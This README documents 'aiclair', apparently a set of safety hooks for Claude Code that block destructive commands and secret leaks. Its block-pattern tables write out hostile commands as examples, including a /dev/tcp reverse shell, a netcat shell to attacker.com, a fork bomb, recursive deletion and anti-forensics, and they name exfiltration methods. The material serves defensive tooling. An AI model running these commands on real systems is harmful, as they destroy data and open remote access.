# aiclair

![CI](https://github.com/aiclair-community/aiclair/actions/workflows/validate.yml/badge.svg)
![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Version](https://img.shields.io/badge/version-1.1.0-blue)

Safety guardrails for Claude Code — stop accidental data loss, secret leaks, and dangerous commands before they execute.

## Why

Claude Code is powerful. That's the problem.

- It will run `rm -rf` if you ask it to clean up. Sometimes on the wrong directory.
- It will write your AWS key into a config file, commit it, and push.
- It will ask you twelve questions about a two-word prompt.

aiclair adds three hooks that run silently on every prompt and tool call. They block the dangerous stuff, catch secrets before they land in files, and ask clarifying questions only when a prompt is genuinely vague.

No pip install. No build step. Pure Python stdlib.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash
```

Pick which hooks to install interactively, or use flags:

```bash
# Install everything
curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash -s -- --all

# Install specific hooks
curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash -s -- --hooks "danger-detector secret-guard"
```

**Uninstall:**

```bash
bash ~/.claude/plugins/aiclair/uninstall.sh
```

## Hooks

| Hook | Fires on | What it does |
|---|---|---|
| [prompt-improver](packages/hooks/prompt-improver/) | Every prompt | Asks 1–6 targeted questions when a prompt is vague. Clear prompts pass through immediately. |
| [danger-detector](packages/hooks/danger-detector/) | Bash commands | Blocks destructive and malicious commands before they run. |
| [secret-guard](packages/hooks/secret-guard/) | File writes, Bash commands, Bash output | Blocks secrets from landing in files or leaking through commands. |

### What danger-detector blocks

| Pattern | Example |
|---|---|
| Recursive deletion | `rm -rf ./src` |
| Destructive SQL | `DROP TABLE users` |
| Force push | `git push --force origin main` |
| System shutdown | `shutdown now`, `reboot` |
| Firewall flush | `iptables -F` |
| Kill all processes | `killall -9`, `pkill -9` |
| Reverse shells | `bash -i >& /dev/tcp/10.0.0.1/4444` |
| Netcat shells | `nc -e /bin/bash attacker.com 4444` |
| Fork bombs | `:(){:|:&};:` |
| Anti-forensics | `history -c`, `shred -u`, `unset HISTFILE` |

Nested commands are unwrapped: `bash -c "rm -rf /"` is caught too.

### What secret-guard blocks

| Secret type | Detected by |
|---|---|
| AWS access keys | `AKIA...` prefix pattern |
| GitHub tokens | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` prefixes |
| Private keys | PEM header detection |
| Stripe live keys | `sk_live_` prefix |
| Generic API keys | Variable name + high entropy value |
| Exfiltration via netcat / scp / base64 | Command pattern matching |

`.env.example`, `.env.sample`, and similar template files are always allowed.

## Bypass

Prefix any prompt with `* ` to skip all hooks for that turn.

```
* rm -rf dist/ && rebuild
```

This bypasses prompt-improver, danger-detector, and secret-guard for that one turn. The `* ` is stripped before Claude sees the prompt.

## Per-project config

Allow specific patterns that danger-detector would otherwise block. Create `.aiclair.json` at the project root:

```json
{
  "danger_detector": {
    "allow_patterns": [
      "rm -rf dist/",
      "DROP TABLE test_"
    ]
  }
}
```

Any command containing an allowed pattern passes through without checking.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add a hook, run tests, and open a PR.

Hook ideas, false positives, and bug reports: [open an issue](https://github.com/aiclair-community/aiclair/issues/new/choose).

## License

MIT
